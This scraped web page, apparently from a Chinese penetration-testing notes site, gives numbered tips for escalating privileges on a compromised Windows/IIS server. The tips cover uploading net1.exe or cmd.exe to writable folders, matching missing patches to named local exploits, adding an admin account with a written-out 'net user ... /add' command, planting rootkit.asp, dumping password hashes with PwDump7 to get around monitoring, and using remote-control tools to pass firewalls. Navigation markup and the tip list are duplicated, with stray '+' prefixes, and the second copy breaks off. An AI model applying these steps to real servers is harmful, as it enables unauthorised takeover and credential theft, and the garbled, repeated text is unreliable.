class="sidebar-link">Metasploit Win10提权</a></li></ul></section></li></ul> </aside> <div><main class="page"> <div class="theme-default-content content__default"><h1 id="asp-web提权"><a href="#asp-web提权" class="header-anchor">#</a> ASP Web提权</h1> <h2 id="web提权"><a href="#web提权" class="header-anchor">#</a> web提权</h2> <p>1.能不能执行cmd就看这个命令：net user，net不行就用net1，再不行就上传一个net到可写可读目录，执行<code>/c c:\windows\temp\cookies\net1.exe user</code></p> <p>2.当提权成功，3389没开的情况下，上传开3389的vps没成功时，试试上传rootkit.asp 用刚提权的用户登录进去就是system权限，再试试一般就可以了。</p> <p>3.cmd拒绝访问的话就自己上传一个cmd.exe 自己上传的后缀是不限制后缀的，<code>cmd.exe/cmd.com/cmd.txt</code> 都可以。</p> <p>4.cmd命令：systeminfo，看看有没有KB952004、KB956572、KB970483这三个补丁，如果没有，第一个是pr提权，第二个是巴西烤肉提权，第三个是iis6.0提权。</p> <p>6.c:\windows\temp\cookies\  这个目录</p> <p>7.找sa密码或是root密码，直接利用大马的文件搜索功能直接搜索，超方便！</p> <p>8.cmd执行exp没回显的解决方法：com路径那里输入exp路径C:\RECYCLER\pr.exe，命令那里清空(包括/c )输入<code>net user jianmei daxia /add</code></p> <p>9.增加用户并提升为管理员权限之后，如果连接不上3389，上传rootkit.asp脚本，访问会提示登录，用提权成功的账号密码登录进去就可以拥有管理员权限了。</p> <p>10.有时变态监控不让添加用户，可以尝试抓管理哈希值，上传“PwDump7 破解当前管理密码(hash值)”，俩个都上传，执行PwDump7.exe就可以了，之后到网站去解密即可。</p> <p>11.有时增加不上用户，有可能是密码过于简单或是过于复杂，还有就是杀软的拦截，命令 tasklist 查看进程</p> <p>12.其实星外提权只要一个可执行的文件即可，先运行一遍cmd，之后把星外ee.exe命名为log.csv 就可以执行了。</p> <p>13.用wt.asp扫出来的目录，其中红色的文件可以替换成exp，执行命令时cmd那里输入替换的文件路径，下面清空双引号加增加用户的命令。</p> <p>14.提权很无奈的时候，可以试试TV远控，通杀内外网，穿透防火墙，很强大的。</p> <p>15.当可读可写目录存在空格的时候，会出现这样的情况：’C:\Documents’ 不是内部或外部命令，也不是可运行的程序 或批处理文件。解决办法是利用菜刀的交互shell切换到exp路径，如：<code>Cd C:\Documents and Settings\All Users\Application Data\Microsoft</code> 目录
+  导读
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="核心技术" class="dropdown-title"><span class="title">核心技术</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          Java核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/java/basics/2022-04-28-全网最全正则表达式总结.html" class="nav-link">
+  Java基础
+</a></li><li class="dropdown-subitem"><a href="/md/core/java/advanced/default.html" class="nav-link">
+  Java进阶
+</a></li><li class="dropdown-subitem"><a href="/md/core/java/senior/default.html" class="nav-link">
+  Java高级
+</a></li><li class="dropdown-subitem"><a href="/md/core/java/java8/2022-03-31-001-Java8有哪些新特性呢？.html" class="nav-link">
+  Java8新特性
+</a></li></ul></li><li class="dropdown-item"><h4>
+          Spring核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/spring/ioc/2022-04-04-001-聊聊Spring注解驱动开发那些事儿.html" class="nav-link">
+  IOC核心技术
+</a></li><li class="dropdown-subitem"><a href="/md/core/spring/aop/default.html" class="nav-link">
+  AOP核心技术
+</a></li></ul></li><li class="dropdown-item"><h4>
+          JVM核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/jvm/2022-04-18-001-JVM调优的几种场景.html" class="nav-link">
+  JVM调优技术
+</a></li></ul></li><li class="dropdown-item"><h4>
+          MySQL核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/mysql/base/2022-07-09-《MySQL核心知识》第1章-开篇-专栏介绍.html" class="nav-link">
+  MySQL基础篇
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="性能调优" class="dropdown-title"><span class="title">性能调优</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/performance/jvm/default.html" class="nav-link">
+  JVM性能调优
+</a></li><li class="dropdown-item"><!----> <a href="/md/performance/tomcat/default.html" class="nav-link">
+  Tomcat性能调优
+</a></li><li class="dropdown-item"><!----> <a href="/md/performance/mysql/default.html" class="nav-link">
+  MySQL性能调优
+</a></li><li class="dropdown-item"><!----> <a href="/md/performance/system/default.html" class="nav-link">
+  操作系统性能调优
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="并发编程" class="dropdown-title"><span class="title">并发编程</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/concurrent/bottom/default.html" class="nav-link">
+  底层技术
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/source/2020-03-30-001-一文搞懂线程与多线程.html" class="nav-link">
+  源码分析
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/basics/2020-03-30-001-明明中断了线程，却为何不起作用呢？.html" class="nav-link">
+  基础案例
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/ActualCombat/default.html" class="nav-link">
+  实战案例
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/interview/default.html" class="nav-link">
+  面试
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/framework/default.html" class="nav-link">
+  系统架构
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="框架源码" class="dropdown-title"><span class="title">框架源码</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/frame/spring/default.html" class="nav-link">
+  Spring源码
+</a></li><li class="dropdown-item"><!----> <a href="/md/frame/springmvc/default.html" class="nav-link">
+  SpringMVC源码
+</a></li><li class="dropdown-item"><!----> <a href="/md/frame/mybatis/default.html" class="nav-link">
+  MyBatis源码
+</a></li><li class="dropdown-item"><!----> <a href="/md/frame/dubbo/default.html" class="nav-link">
+  Dubbo源码
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="分布式" class="dropdown-title"><span class="title">分布式</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          缓存技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/cache/default.html" class="nav-link">
+  Redis
+</a></li></ul></li><li class="dropdown-item"><h4>
+          服务注册发现
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/zookeeper/default.html" class="nav-link">
+  Zookeeper
+</a></li></ul></li><li class="dropdown-item"><h4>
+          消息中间件
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/mq/rabbitmq/default.html" class="nav-link">
+  RabbitMQ
+</a></li><li class="dropdown-subitem"><a href="/md/distributed/mq/rocketmq/default.html" class="nav-link">
+  RocketMQ
+</a></li><li class="dropdown-subitem"><a href="/md/distributed/mq/kafka/default.html" class="nav-link">
+  Kafka
+</a></li></ul></li><li class="dropdown-item"><h4>
+          网络通信
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/netty/default.html" class="nav-link">
+  Netty
+</a></li></ul></li><li class="dropdown-item"><h4>
+          远程调用
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/dubbo/default.html" class="nav-link">
+  Dubbo
+</a></li></ul></li><li class="dropdown-item"><h4>
+          数据库
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/mongodb/default.html" class="nav-link">
+  MongoDB
+</a></li></ul></li><li class="dropdown-item"><h4>
+          搜索引擎
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/es/default.html" class="nav-link">
+  ElasticSearch
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="微服务" class="dropdown-title"><span class="title">微服务</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/microservices/springboot/default.html" class="nav-link">
+  SpringBoot
+</a></li><li class="dropdown-item"><!----> <a href="/md/microservices/springcloudalibaba/2022-04-02-SpringCloudAlibaba专栏开篇.html" class="nav-link">
+  SpringCloudAlibaba
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="中间件" class="dropdown-title"><span class="title">中间件</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/middleware/bytecode/2022-04-11-001-工作多年的你依然重复做着CRUD-是否接触过这种技术.html" class="nav-link">
+  字节码编程
+</a></li><li class="dropdown-item"><!----> <a href="/md/middleware/threadpool/default.html" class="nav-link">
+  手写线程池
+</a></li><li class="dropdown-item"><!----> <a href="/md/middleware/limiter/default.html" class="nav-link">
+  分布式限流
+</a></li><li class="dropdown-item"><!----> <a href="/md/middleware/independent/default.html" class="nav-link">
+  开源项目
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="项目实战" class="dropdown-title"><span class="title">项目实战</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/microservices/springcloudalibaba/2022-04-02-SpringCloudAlibaba专栏开篇.html" class="nav-link">
+  SpringCloud Alibaba实战
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="渗透技术" class="dropdown-title"><span class="title">渗透技术</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/hack/log4j/2022-05-30-冰河连夜复现了Log4j最新重大漏洞.html" class="nav-link">
+  log4j重大漏洞
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/environment/2022-04-17-001-安装Kali系统.html" class="nav-link">
+  基础环境篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/tools/2022-04-17-001-使用Easy-Creds工具攻击无线网络.html" class="nav-link">
+  渗透工具篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/horse/2022-05-02-001-各种一句话木马大全.html" class="nav-link">
+  木马篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/sql/2022-05-02-001-sqli-labs-master下载与安装.html" class="nav-link">
+  SQL注入篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/shell/2022-05-02-001-各种解析漏洞拿shell.html" class="nav-link">
+  漏洞拿Shell篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/crack/2022-05-02-001-使用rarcrack暴力破解RAR-ZIP-7Z压缩包.html" class="nav-link">
+  暴力破解篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/bash/2022-05-02-001-3389脚本开启代码(vbs版).html" class="nav-link">
+  渗透脚本篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/raising/2022-05-02-001-数据库提权.html" class="nav-link">
+  数据与系统提权篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/client/2022-05-02-001-浏览器渗透.html" class="nav-link">
+  客户端渗透篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/sociology/2022-05-02-001-Metasploit之社会工程学工具包.html" class="nav-link">
+  社会工程学
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/question/2022-05-02-001-HTTP错误4031禁止访问-执行访问被拒绝.html" class="nav-link">
+  问题记录篇
+</a></li></ul></div></div><div class="nav-item"><a href="/md/interview/2022-04-18-001-面试必问-聊聊JVM性能调优.html" class="nav-link">
+  面试必问系列
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="📚PDF" class="dropdown-title"><span class="title">📚PDF</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          出版图书
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-06-17-深入理解高并发编程.html" class="nav-link">
+  《深入理解高并发编程：核心原理与案例实战》
+</a></li><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-03-29-深入理解分布式事务.html" class="nav-link">
+  《深入理解分布式事务：原理与实战》
+</a></li><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-03-29-MySQL技术大全.html" class="nav-link">
+  《MySQL技术大全：开发、优化与运维实战》
+</a></li><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-03-29-海量数据处理与大数据技术实战.html" class="nav-link">
+  《海量数据处理与大数据技术实战》
+</a></li></ul></li><li class="dropdown-item"><h4>
+          电子书籍
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/knowledge/pdf/2022-03-30-《冰河的渗透实战笔记》电子书，442页，37万字，正式发布.html" class="nav-link">
+  冰河的渗透实战笔记
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="关于" class="dropdown-title"><span class="title">关于</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/about/me/about-me.html" class="nav-link">
+  关于自己
+</a></li><li class="dropdown-item"><!----> <a href="/md/about/study/default.html" class="nav-link">
+  关于学习
+</a></li><li class="dropdown-item"><!----> <a href="/md/about/job/default.html" class="nav-link">
+  关于职场
+</a></li></ul></div></div><div class="nav-item"><a href="https://space.bilibili.com/517638832" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  B站
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div><div class="nav-item"><a href="https://github.com/binghe001/BingheGuide" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Github
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/md/other/guide-to-reading.html" class="nav-link">
+  导读
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="核心技术" class="dropdown-title"><span class="title">核心技术</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          Java核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/java/basics/2022-04-28-全网最全正则表达式总结.html" class="nav-link">
+  Java基础
+</a></li><li class="dropdown-subitem"><a href="/md/core/java/advanced/default.html" class="nav-link">
+  Java进阶
+</a></li><li class="dropdown-subitem"><a href="/md/core/java/senior/default.html" class="nav-link">
+  Java高级
+</a></li><li class="dropdown-subitem"><a href="/md/core/java/java8/2022-03-31-001-Java8有哪些新特性呢？.html" class="nav-link">
+  Java8新特性
+</a></li></ul></li><li class="dropdown-item"><h4>
+          Spring核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/spring/ioc/2022-04-04-001-聊聊Spring注解驱动开发那些事儿.html" class="nav-link">
+  IOC核心技术
+</a></li><li class="dropdown-subitem"><a href="/md/core/spring/aop/default.html" class="nav-link">
+  AOP核心技术
+</a></li></ul></li><li class="dropdown-item"><h4>
+          JVM核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/jvm/2022-04-18-001-JVM调优的几种场景.html" class="nav-link">
+  JVM调优技术
+</a></li></ul></li><li class="dropdown-item"><h4>
+          MySQL核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/mysql/base/2022-07-09-《MySQL核心知识》第1章-开篇-专栏介绍.html" class="nav-link">
+  MySQL基础篇
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="性能调优" class="dropdown-title"><span class="title">性能调优</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/performance/jvm/default.html" class="nav-link">
+  JVM性能调优
+</a></li><li class="dropdown-item"><!----> <a href="/md/performance/tomcat/default.html" class="nav-link">
+  Tomcat性能调优
+</a></li><li class="dropdown-item"><!----> <a href="/md/performance/mysql/default.html" class="nav-link">
+  MySQL性能调优
+</a></li><li class="dropdown-item"><!----> <a href="/md/performance/system/default.html" class="nav-link">
+  操作系统性能调优
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="并发编程" class="dropdown-title"><span class="title">并发编程</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/concurrent/bottom/default.html" class="nav-link">
+  底层技术
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/source/2020-03-30-001-一文搞懂线程与多线程.html" class="nav-link">
+  源码分析
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/basics/2020-03-30-001-明明中断了线程，却为何不起作用呢？.html" class="nav-link">
+  基础案例
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/ActualCombat/default.html" class="nav-link">
+  实战案例
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/interview/default.html" class="nav-link">
+  面试
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/framework/default.html" class="nav-link">
+  系统架构
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="框架源码" class="dropdown-title"><span class="title">框架源码</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/frame/spring/default.html" class="nav-link">
+  Spring源码
+</a></li><li class="dropdown-item"><!----> <a href="/md/frame/springmvc/default.html" class="nav-link">
+  SpringMVC源码
+</a></li><li class="dropdown-item"><!----> <a href="/md/frame/mybatis/default.html" class="nav-link">
+  MyBatis源码
+</a></li><li class="dropdown-item"><!----> <a href="/md/frame/dubbo/default.html" class="nav-link">
+  Dubbo源码
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="分布式" class="dropdown-title"><span class="title">分布式</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          缓存技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/cache/default.html" class="nav-link">
+  Redis
+</a></li></ul></li><li class="dropdown-item"><h4>
+          服务注册发现
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/zookeeper/default.html" class="nav-link">
+  Zookeeper
+</a></li></ul></li><li class="dropdown-item"><h4>
+          消息中间件
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/mq/rabbitmq/default.html" class="nav-link">
+  RabbitMQ
+</a></li><li class="dropdown-subitem"><a href="/md/distributed/mq/rocketmq/default.html" class="nav-link">
+  RocketMQ
+</a></li><li class="dropdown-subitem"><a href="/md/distributed/mq/kafka/default.html" class="nav-link">
+  Kafka
+</a></li></ul></li><li class="dropdown-item"><h4>
+          网络通信
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/netty/default.html" class="nav-link">
+  Netty
+</a></li></ul></li><li class="dropdown-item"><h4>
+          远程调用
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/dubbo/default.html" class="nav-link">
+  Dubbo
+</a></li></ul></li><li class="dropdown-item"><h4>
+          数据库
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/mongodb/default.html" class="nav-link">
+  MongoDB
+</a></li></ul></li><li class="dropdown-item"><h4>
+          搜索引擎
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/es/default.html" class="nav-link">
+  ElasticSearch
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="微服务" class="dropdown-title"><span class="title">微服务</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/microservices/springboot/default.html" class="nav-link">
+  SpringBoot
+</a></li><li class="dropdown-item"><!----> <a href="/md/microservices/springcloudalibaba/2022-04-02-SpringCloudAlibaba专栏开篇.html" class="nav-link">
+  SpringCloudAlibaba
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="中间件" class="dropdown-title"><span class="title">中间件</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/middleware/bytecode/2022-04-11-001-工作多年的你依然重复做着CRUD-是否接触过这种技术.html" class="nav-link">
+  字节码编程
+</a></li><li class="dropdown-item"><!----> <a href="/md/middleware/threadpool/default.html" class="nav-link">
+  手写线程池
+</a></li><li class="dropdown-item"><!----> <a href="/md/middleware/limiter/default.html" class="nav-link">
+  分布式限流
+</a></li><li class="dropdown-item"><!----> <a href="/md/middleware/independent/default.html" class="nav-link">
+  开源项目
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="项目实战" class="dropdown-title"><span class="title">项目实战</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/microservices/springcloudalibaba/2022-04-02-SpringCloudAlibaba专栏开篇.html" class="nav-link">
+  SpringCloud Alibaba实战
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="渗透技术" class="dropdown-title"><span class="title">渗透技术</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/hack/log4j/2022-05-30-冰河连夜复现了Log4j最新重大漏洞.html" class="nav-link">
+  log4j重大漏洞
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/environment/2022-04-17-001-安装Kali系统.html" class="nav-link">
+  基础环境篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/tools/2022-04-17-001-使用Easy-Creds工具攻击无线网络.html" class="nav-link">
+  渗透工具篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/horse/2022-05-02-001-各种一句话木马大全.html" class="nav-link">
+  木马篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/sql/2022-05-02-001-sqli-labs-master下载与安装.html" class="nav-link">
+  SQL注入篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/shell/2022-05-02-001-各种解析漏洞拿shell.html" class="nav-link">
+  漏洞拿Shell篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/crack/2022-05-02-001-使用rarcrack暴力破解RAR-ZIP-7Z压缩包.html" class="nav-link">
+  暴力破解篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/bash/2022-05-02-001-3389脚本开启代码(vbs版).html" class="nav-link">
+  渗透脚本篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/raising/2022-05-02-001-数据库提权.html" class="nav-link">
+  数据与系统提权篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/client/2022-05-02-001-浏览器渗透.html" class="nav-link">
+  客户端渗透篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/sociology/2022-05-02-001-Metasploit之社会工程学工具包.html" class="nav-link">
+  社会工程学
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/question/2022-05-02-001-HTTP错误4031禁止访问-执行访问被拒绝.html" class="nav-link">
+  问题记录篇
+</a></li></ul></div></div><div class="nav-item"><a href="/md/interview/2022-04-18-001-面试必问-聊聊JVM性能调优.html" class="nav-link">
+  面试必问系列
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="📚PDF" class="dropdown-title"><span class="title">📚PDF</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          出版图书
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-06-17-深入理解高并发编程.html" class="nav-link">
+  《深入理解高并发编程：核心原理与案例实战》
+</a></li><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-03-29-深入理解分布式事务.html" class="nav-link">
+  《深入理解分布式事务：原理与实战》
+</a></li><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-03-29-MySQL技术大全.html" class="nav-link">
+  《MySQL技术大全：开发、优化与运维实战》
+</a></li><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-03-29-海量数据处理与大数据技术实战.html" class="nav-link">
+  《海量数据处理与大数据技术实战》
+</a></li></ul></li><li class="dropdown-item"><h4>
+          电子书籍
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/knowledge/pdf/2022-03-30-《冰河的渗透实战笔记》电子书，442页，37万字，正式发布.html" class="nav-link">
+  冰河的渗透实战笔记
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="关于" class="dropdown-title"><span class="title">关于</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/about/me/about-me.html" class="nav-link">
+  关于自己
+</a></li><li class="dropdown-item"><!----> <a href="/md/about/study/default.html" class="nav-link">
+  关于学习
+</a></li><li class="dropdown-item"><!----> <a href="/md/about/job/default.html" class="nav-link">
+  关于职场
+</a></li></ul></div></div><div class="nav-item"><a href="https://space.bilibili.com/517638832" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  B站
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div><div class="nav-item"><a href="https://github.com/binghe001/BingheGuide" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Github
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>数据与系统提权篇</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/md/hack/raising/2022-05-02-001-数据库提权.html" class="sidebar-link">数据库提权</a></li><li><a href="/md/hack/raising/2022-05-02-002-NC反弹CMDSHELL提权总结.html" class="sidebar-link">NC反弹CMDSHELL提权总结</a></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web提权.html" class="active sidebar-link">ASP Web提权</a></li><li><a href="/md/hack/raising/2022-05-02-004-MSF提权.html" class="sidebar-link">MSF提权</a></li><li><a href="/md/hack/raising/2022-05-02-005-Metasploit-Win10提权.html" class="sidebar-link">Metasploit Win10提权</a></li></ul></section></li></ul> </aside> <div><main class="page"> <div class="theme-default-content content__default"><h1 id="asp-web提权"><a href="#asp-web提权" class="header-anchor">#</a> ASP Web提权</h1> <h2 id="web提权"><a href="#web提权" class="header-anchor">#</a> web提权</h2> <p>1.能不能执行cmd就看这个命令：net user，net不行就用net1，再不行就上传一个net到可写可读目录，执行<code>/c c:\windows\temp\cookies\net1.exe user</code></p> <p>2.当提权成功，3389没开的情况下，上传开3389的vps没成功时，试试上传rootkit.asp 用刚提权的用户登录进去就是system权限，再试试一般就可以了。</p> <p>3.cmd拒绝访问的话就自己上传一个cmd.exe 自己上传的后缀是不限制后缀的，<code>cmd.exe/cmd.com/cmd.txt</code> 都可以。</p> 